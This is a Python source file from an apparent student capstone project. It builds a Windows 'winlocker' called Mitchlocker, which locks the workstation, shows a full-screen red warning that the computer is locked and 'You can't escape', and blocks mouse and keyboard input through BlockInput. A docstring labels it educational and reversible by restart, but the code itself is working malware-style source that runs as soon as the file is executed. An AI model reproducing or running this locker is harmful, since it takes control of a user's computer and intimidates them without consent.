""" This is an educational piece of software. Do not use this for malicious purposes!

    Author: Patrick Mitchell
    Professor: Anup Parajuli
    Class: Capstone
    School: Lake Superior College

    Purpose: For my capstone project I will be developing a winlocker variant named mitchware. This
    winlocker virus will lock the user and then warn the user that the program is executing. After
    the warning an image will appear showing an image telling you your screen is locked. Your mouse
    and keyboard input will be disabled. This program can be undone simply by restarting your computer
    or recovering from a snapshot."""


from tkinter import *
#For screen locker creation

from tkinter import messagebox
#To make messages appear

import ctypes
#To call windll functions

import time
#To delay certain defined functions


def user_lockout():

    ctypes.windll.user32.LockWorkStation()
#This function calls the windll to lock out the current user

  

def screen_locker():

    time.sleep(10)#To wait for the user lockout before execution

    messagebox.showwarning("Alert!", "Mitchlocker has begun execution process.")

    mitch = Tk()

    mitch.attributes('-fullscreen', True)

    mitch.title("Mitchlocker")

    mitch["bg"] = "red"

    mit = Label(mitch,bg="red", fg="black",text="Your computer is locked by mitchlocker!\n\n", font="HoboStd 30").pack()

    mit = Label(mitch,bg="red", fg="black",text="_______________________________________________________________________ \n", font="HoboStd 20").pack()

    mit = Label(mitch,bg="red", fg="black",text="You are currently seeing this screen because you have decided to execute this program. Your mouse and keyboard input are also locked. You can't escape. \n", font="HoboStd 11").pack()

    mit = Label(mitch,bg="red", fg="black",text="________________________________________________________________________ \n\n", font="HoboStd 20").pack()

    mit = Label(mitch,bg="red", fg="black",text="This computer will remain locked until you find a way to unlock it!!! \n", font="HoboStd 20").pack()     

    

    
def input_locker():
    input1 = ctypes.windll.user32.BlockInput(True)

user_lockout()
screen_locker()
input_locker()
